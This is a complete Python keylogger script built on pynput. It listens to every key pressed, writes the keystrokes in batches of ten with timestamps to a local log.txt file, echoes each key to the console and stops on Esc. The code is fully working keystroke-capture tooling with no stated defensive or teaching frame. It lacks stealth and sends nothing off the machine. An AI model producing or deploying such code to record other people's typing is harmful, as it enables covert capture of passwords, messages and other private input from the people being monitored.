import pynput
from pynput.keyboard import Key, Listener
import time

count = 0
keys = []

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    #Buffered logging in the file
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            
           
            if k.find("space") > 0:
                f.write(" [SPACE] ")
            elif k == "Key.enter":
                f.write("\n[ENTER]\n")
            elif k == "Key.backspace":
                f.write("[BACKSPACE]")
            elif k == "Key.tab":
                f.write("[TAB]")
            elif k.find("Key") == -1:
                f.write(k)

      
        f.write(f"\n[Logged at: {time.strftime('%Y-%m-%d %H:%M:%S')}]\n")

def on_release(key):
    if key == Key.esc:
        print("Logging stopped.")
        return False


with Listener(
    on_press=on_press,
    on_release=on_release
) as listener:
    listener.join()
